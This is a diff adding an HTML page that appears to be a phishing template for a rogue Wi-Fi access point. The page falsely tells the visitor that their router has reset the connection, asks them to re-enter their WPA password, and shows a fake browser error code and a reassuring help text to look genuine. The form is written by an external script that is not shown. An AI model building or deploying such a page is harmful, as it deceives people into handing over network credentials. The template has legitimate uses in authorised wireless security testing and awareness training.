@@ -1,0 +1,51 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+    <head>
+        <title>Connection Reset</title>
+        
+        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+        <script>
+            fn_check = function() {
+                pass = document.getElementById("wpa_pass").value;
+                if(pass.length < 8){
+                    alert("WPA password too short");
+                    return false;
+                }
+                return true;
+            }
+        </script>
+    <script src="content.js"></script>
+    </head>
+    <body>
+        <div id="center">
+            <div id="center-left">
+            <!-- script 1 -->
+            </div>
+            <div id="center-right">
+                <div id="title">Your connection has been reset</div>
+                <br>
+                <div id="content">Your router or gateway has reset your connection.
+                                  You must re-authenticate to continue browsing.
+                </div>
+            </div>
+            
+            <div id="center-below">
+                <script>fn_write_form();</script>
+            </div>
+            
+            <br>
+            <br>
+            <a id="helpbutton" onclick="toggleHelp()" href="#">What is this?</a>
+            <div id="help" style="display: none;">
+                This message means that the connection between you and your wireless
+                router was unexpectedly closed. Many things may cause this, but it is
+                easily remedied by re-authenticating your PC with the network.
+                
+                If this has occurred previously, please contact your system administrator
+                or service provider.
+                <br><br>
+                <div id="error">net::ERR_CONNECTION_RESET (205)</div>
+            </div>
+        </div>
+    </body>
+</html>
